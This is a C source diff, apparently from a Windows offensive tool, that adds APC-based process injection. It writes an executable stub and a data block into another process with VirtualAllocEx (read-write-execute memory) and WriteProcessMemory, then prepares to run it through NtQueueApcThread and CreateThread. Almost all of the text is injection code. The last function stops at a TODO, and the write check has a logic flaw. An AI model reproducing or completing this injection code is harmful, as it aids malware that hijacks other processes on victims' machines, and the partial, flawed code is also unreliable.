@@ -248,6 +248,67 @@ BOOL ExecuteViaNtQueueApcThread_s(INJECTION* injection, LPVOID lpStartAddress, L
 	return ResumeThread(injection->thread) != -1;
 }
 
+
+//CreateThread typedef
+typedef HANDLE(WINAPI* FN_KERNEL32_CREATETHREAD)(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ __drv_aliasesMem LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
+typedef struct _NT_QUEUE_APC_THREAD_DATA
+{
+	LPVOID lpStartAddress;
+	LPVOID lpAddress;
+	FN_KERNEL32_CREATETHREAD pCreateThread;
+	BOOL isExecuted;
+	CHAR payload[];
+} NT_QUEUE_APC_THREAD_DATA, *PNT_QUEUE_APC_THREAD_DATA;
+
+#if IS_X64()
+#define TEB$ActivationContextStack() ((char*)NtCurrentTeb() + 0x2c8)
+#else
+#define TEB$ActivationContextStack() ((char*)NtCurrentTeb() + 0x1a8)
+#endif
+
+#pragma code_seg(push, ".text$KKK000")
+__declspec(noinline) void NtQueueApcThreadProc(PNT_QUEUE_APC_THREAD_DATA pData)
+{
+	if (pData->isExecuted)
+		return;
+
+	if (!(TEB$ActivationContextStack()))
+		return;
+
+	pData->isExecuted = TRUE;
+	pData->pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pData->lpStartAddress, pData->lpAddress, 0, NULL);
+}
+#pragma code_seg(pop)
+
+#pragma code_seg(push, ".text$KKK001")
+__declspec(noinline) void NtQueueApcThreadProc_End(void) {}
+#pragma code_seg(pop)
+
+LPVOID ExecuteViaNtQueueApcThreadInternal(HANDLE hProcess, DWORD pid, PNT_QUEUE_APC_THREAD_DATA pData)
+{
+	SIZE_T payloadSize = (DWORD64)NtQueueApcThreadProc_End - (DWORD64)NtQueueApcThreadProc;
+	SIZE_T dwSize = sizeof(NT_QUEUE_APC_THREAD_DATA) + payloadSize;
+	PNT_QUEUE_APC_THREAD_DATA pAllocedData = malloc(dwSize);
+	*pAllocedData = *pData;
+	memcpy(pAllocedData->payload, (PVOID)NtQueueApcThreadProc, payloadSize);
+	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	SIZE_T wrote;
+	if (lpBaseAddress && WriteProcessMemory(hProcess, lpBaseAddress, pAllocedData, dwSize, &wrote) && wrote != dwSize)
+		lpBaseAddress = NULL;
+
+	free(pAllocedData);
+	return lpBaseAddress;
+}
+
+BOOL ExecuteViaNtQueueApcThread(INJECTION* injection, LPVOID lpStartAddress, LPVOID lpParameter)
+{
+	HMODULE hModule = GetModuleHandleA("ntdll");
+	FN_NTDLL_NTQUEUEAPCTHREAD _NtQueueApcThread = (FN_NTDLL_NTQUEUEAPCTHREAD)GetProcAddress(hModule, "NtQueueApcThread");
+	LTODO("");
+}
+
+
+
 void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset, char* parameter)
 {
 	char* target;
